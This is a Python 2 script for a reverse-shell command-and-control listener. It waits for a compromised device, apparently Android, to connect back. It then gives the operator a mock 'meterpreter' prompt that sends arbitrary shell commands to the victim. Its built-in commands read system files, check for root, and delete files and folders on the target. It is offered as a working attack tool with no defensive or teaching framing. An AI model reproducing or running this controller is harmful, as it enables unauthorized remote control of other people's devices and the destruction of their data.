#!/usr/bin/env python
# -*- coding: utf-8 -*-
R = '\033[31m' # Red
N = '\033[1;37m' # White
B = '\033[1;34m' #Blue
import os
import sys
from time import sleep

host = sys.argv[1]
port = int(sys.argv[2])

import socket
import sys
from time import sleep

print(""+B+"[*]"+N+" Listeing on port "+str(port))
sleep(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print(""+R+"["+B+"*"+R+"]"+N+" Waiting Connection From Client . . .")
c, _ = s.accept()
print(''+R+'['+B+'!'+R+']'+N+' Sessions Opened | ' + 'IP : ' + _[0] + ' | Port : ' + str(_[1])+'\n')
sleep(2)
def main():
 while True:
     hosttt = _[0]
     cmd = raw_input('meterpreter'+hosttt+'> ')
     if cmd[0:5] == 'mkdir':
      c.send(cmd+' && pwd\n')
      c.recv(1024)
					
     elif cmd == 'meminfo':
      c.send('cat /proc/meminfo')
      print c.recv(1024)

     elif cmd == 'cpuinfo':
      c.send('cat /proc/cpuinfo')
      print c.recv(1024)

     elif cmd == 'crypto':
      c.send('cat /proc/crypto')
      print c.recv(10000)

     elif cmd == 'kernel_info':
      c.send(cmd)
      ab = c.recv(1024)
      print("\n[+] \033[37;1mKernel Version : "+ab)

     elif cmd == 'check_root':
      c.send('which su')
      a = c.recv(1024)
      if a == '\n/system/bin/su\n':
       print("\n[*] This Device Is Rooted . . .\n")
      else:
       print("\n[*] This Device Not Rooted . . .\n")

     elif cmd == 'su':
      print("\n[*] Command 'SU' Not Working . . .\n")
      main()

     elif cmd == 'check_partitions':
      c.send('cat /proc/partitions')
      print ''
      print c.recv(100000)

     elif cmd == 'help':
      print("""
kernel_info      : Cek Kernel Version + Info
mkdir            : Create Directory On Target
meminfo          : Check Info Memory Target
cpuinfo          : Check Info CPU Target
rm               : Remove File On Target
rmdir            : Remove Folder On Target
whoami           : Check Name User Target
crypto           : Check Encoding On Target
check_partitions : Check Info Partisi On Target
""")

     elif cmd[0:2] == 'rm':
      c.send(cmd+' && pwd\n')
      c.recv(1024)
					
     elif cmd[0:5] == 'rmdir':
      c.send(cmd+' && pwd\n')
      c.recv(1024)
				
     elif cmd[0:6] == 'whoami':
      c.send('whoami')
      print c.recv(1024)

     elif cmd == '':
      main()

     else:

      c.send(cmd)
      results = c.recv(4096)
      if results == 'bacod':
       main()
      print results

try:
    main()
except KeyboardInterrupt:
    print("[!] shutdowning server...")
    sleep(2)
    sys.exit()
except socket.error:
    print(""+R+"[!] "+N+"Client Clossed . . .")
    sleep(2)
    sys.exit()
